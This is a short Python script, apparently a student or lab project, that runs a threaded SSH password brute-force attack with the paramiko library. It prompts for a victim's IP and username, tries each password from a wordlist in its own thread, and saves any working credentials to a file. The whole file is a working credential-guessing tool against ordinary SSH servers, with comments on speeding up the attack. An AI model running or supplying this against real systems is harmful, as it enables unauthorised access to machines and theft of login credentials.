#reem chaaban

from main_config import validate_ip
import paramiko #python library; creates SSH connection
import time
import threading

target_ip = validate_ip("Enter target IP: ") #victim machine IP

#attempts to connect to the SSH server
def ssh_brute_force(host, username, password):
    ssh_client = paramiko.SSHClient() #SSHClient created by utilizing paramiko
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #paramiko function; host key added to victim server
    try:
        #connects using the provided username and password
        ssh_client.connect(host, port=22, username=username, password=password, timeout=3)
        print(f"Successful login: Username: {username}, Password: {password}")
        with open("credentials_found.txt", "a") as fh:
            fh.write(f"Username: {username}\nPassword: {password}\n worked on host {host}\n")
    except paramiko.AuthenticationException:
        print(f"Failed login with username {username} and password: {password}")
    except paramiko.SSHException:
        print("SSH error!") #error message if paramiko encounters error
    except Exception as e:
        print(f"Error: {e}")
    finally:
        ssh_client.close() #closes paramiko SSH client 

#brute forces password list (found on attack machine) on the victim machine;
def perform_bruteforce(host, username, passwd_list):
    with open(passwd_list, "r") as file:
        passwords = file.readlines() #reads each password and attempts brute force one by one 
        for password in passwords:
            password = password.strip()  
            #new password attempt = new thread
            t = threading.Thread(target=ssh_brute_force, args=(host, username, password)) #threading allows for simultaneous passwords to be brute forced -> quicker attack
            t.start()
            time.sleep(0.5)  #delay beteen password attempts

# we reference the list of passwords on the attacker machine to reference while brute forcing
username = input("Enter SSH username: ")
passwd_list = input("Enter the password list's directory (e.g., 'passwds.txt'): ")

perform_bruteforce(target_ip, username, passwd_list)
